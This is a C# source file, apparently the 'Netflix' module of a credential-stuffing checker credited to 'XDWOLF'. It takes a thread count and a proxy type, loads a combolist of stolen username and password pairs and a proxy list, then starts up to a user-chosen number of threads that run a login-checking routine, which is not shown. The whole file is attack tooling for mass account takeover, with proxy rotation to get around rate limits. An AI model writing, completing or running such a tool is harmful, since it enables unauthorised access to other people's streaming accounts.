using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Netflix
{

    internal class Netflix
    {

        [STAThread]
        public static void Netflix1()
        {
            ServicePointManager.DefaultConnectionLimit = 100000000;
            Colorful.Console.SetWindowSize(35, 35);
            Colorful.Console.Title = Colorful.Console.Title = "XDWOLF | Coded by XDWOLF | Module: Netflix |";


            Console.WriteLine();
            Colorful.Console.Write(" Threads", Color.White);
            Colorful.Console.Write(": ", Color.Red);

            try
            {
                CheckerHelper.threads = int.Parse(Colorful.Console.ReadLine());
            }
            catch
            {
                CheckerHelper.threads = 100;
            }
            Console.Clear();
            Console.WriteLine();
            for (; ; )
            {
                Colorful.Console.Write(" Proxys Type like HTTP, SOCKS4, SOCKS5 or PROXYLESS", Color.White);
                Colorful.Console.Write(": ", Color.Red);
                CheckerHelper.proxytype = Colorful.Console.ReadLine();
                CheckerHelper.proxytype = CheckerHelper.proxytype.ToUpper();
                if (CheckerHelper.proxytype == "HTTP" || CheckerHelper.proxytype == "SOCKS4" || CheckerHelper.proxytype == "SOCKS5" || CheckerHelper.proxytype == "PROXYLESS")
                {
                    break;
                }
                Colorful.Console.Write(" Please select a valid proxy format.\n\n", Color.MediumPurple);
            }
            Thread.Sleep(2000);
            Console.Clear();
            Console.WriteLine();

            Task.Factory.StartNew(delegate ()
            {
                CheckerHelper.UpdateTitle();
            });

            Colorful.Console.WriteLine();

            string fileName;
            OpenFileDialog openFileDialog = new OpenFileDialog();

            do
            {
                Colorful.Console.Write(" Please upload your combolist", Color.White);
                Colorful.Console.Write("..\n", Color.Red);
                Thread.Sleep(500);
                openFileDialog.Title = "Select Combo List";
                openFileDialog.DefaultExt = "txt";
                openFileDialog.Filter = "Text files|*.txt";
                openFileDialog.RestoreDirectory = true;
                openFileDialog.ShowDialog();
                fileName = openFileDialog.FileName;
            }
            while (!File.Exists(fileName));

            CheckerHelper.accounts = new List<string>(File.ReadAllLines(fileName));
            CheckerHelper.LoadCombos(fileName);

            Colorful.Console.Write("Successfully uploaded ");
            Colorful.Console.Write(CheckerHelper.total, Color.Red);
            Colorful.Console.WriteLine(" combo lines\n");
            Thread.Sleep(2000);
            Console.Clear();
            Console.WriteLine();
            if (CheckerHelper.proxytype != "NO")
            {

                do
                {
                    Colorful.Console.Write(" Please upload your proxies", Color.White);
                    Colorful.Console.Write("..\n", Color.Red);
                    Thread.Sleep(500);
                    openFileDialog.Title = "Select Proxy List";
                    openFileDialog.DefaultExt = "txt";
                    openFileDialog.Filter = "Text files|*.txt";
                    openFileDialog.RestoreDirectory = true;
                    openFileDialog.ShowDialog();
                    fileName = openFileDialog.FileName;
                }
                while (!File.Exists(fileName));

                CheckerHelper.proxies = new List<string>(File.ReadAllLines(fileName));
                CheckerHelper.LoadProxies(fileName);
                Colorful.Console.Clear();
                Thread.Sleep(2000);
                Console.Clear();
            }
            for (int i = 1; i <= CheckerHelper.threads; i++)
            {
                new Thread(new ThreadStart(CheckerHelper.Check)).Start();
            }

            Colorful.Console.ReadLine();
            Environment.Exit(0);
        }
    }
}